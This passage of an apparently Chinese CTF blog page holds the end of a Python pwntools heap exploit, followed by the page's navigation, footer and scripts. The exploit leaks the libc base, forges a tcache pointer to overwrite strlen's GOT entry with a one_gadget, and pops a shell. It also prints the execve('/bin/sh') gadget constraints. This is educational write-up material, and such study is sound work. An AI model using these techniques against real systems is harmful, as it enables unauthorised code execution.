<span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;m&#x27;</span>)<br>add(<span class="hljs-number">9</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;n&#x27;</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;o&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>  free(i)<br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span> , <span class="hljs-number">0x28</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>show(<span class="hljs-number">1</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21ace0</span> <br><br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x158</span> , <span class="hljs-string">b&#x27;f&#x27;</span>)<br>add(<span class="hljs-number">5</span> , <span class="hljs-number">0x28</span> , <span class="hljs-string">b&#x27;g&#x27;</span>)<br><br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">4</span>)<br><br>strlen_got = libc_base + <span class="hljs-number">0x21A090</span><br>fake_fd = strlen_got ^ (heap_addr &gt;&gt; <span class="hljs-number">12</span>)<br><span class="hljs-built_in">print</span>(p64(fake_fd))<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x31</span>) + p64(fake_fd)[:-<span class="hljs-number">2</span>]<br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x158</span> , payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xebc81 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x78 is writable</span><br><span class="hljs-string">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebc85 execve(&quot;/bin/sh&quot;, r10, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x78 is writable</span><br><span class="hljs-string">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebc88 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x78 is writable</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebce2 execve(&quot;/bin/sh&quot;, rbp-0x50, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x48 is writable</span><br><span class="hljs-string">  r13 == NULL || &#123;&quot;/bin/sh&quot;, r13, NULL&#125; is a valid argv</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebd38 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x48 is writable</span><br><span class="hljs-string">  r12 == NULL || &#123;&quot;/bin/sh&quot;, r12, NULL&#125; is a valid argv</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebd3f execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x48 is writable</span><br><span class="hljs-string">  rax == NULL || &#123;rax, r12, NULL&#125; is a valid argv</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebd43 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x50 is writable</span><br><span class="hljs-string">  rax == NULL || &#123;rax, [rbp-0x48], NULL&#125; is a valid argv</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>oggs = [<span class="hljs-number">0xebc81</span> , <span class="hljs-number">0xebc85</span>, <span class="hljs-number">0xebc88</span>, <span class="hljs-number">0xebce2</span>, <span class="hljs-number">0xebd38</span>, <span class="hljs-number">0xebd3f</span>, <span class="hljs-number">0xebd4</span>]<br>ogg = libc_base + oggs[<span class="hljs-number">1</span>]<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x28</span> , <span class="hljs-string">b&#x27;g&#x27;</span>)<br>lss(<span class="hljs-string">&quot;strlen_got&quot;</span>)<br>pause()<br><br>payload =  p64(libc_base + <span class="hljs-number">0x000000000021A090</span>) + p64(ogg)[:-<span class="hljs-number">2</span>]<br>add(<span class="hljs-number">5</span> , <span class="hljs-number">0x28</span> , payload)<br><br>lss(<span class="hljs-string">&quot;strlen_got&quot;</span>)<br>lss(<span class="hljs-string">&quot;heap_addr&quot;</span>)<br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/25/unsorted%20bin%20attack&amp;&amp;FSOP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/" title="unsorted bin attack&amp;&amp;FSOP利用技巧">
+                        <span class="hidden-mobile">unsorted bin attack&amp;&amp;FSOP利用技巧</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <span>P0ach1l</span></a> <i class="iconfont icon-love"></i> <span>GX</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
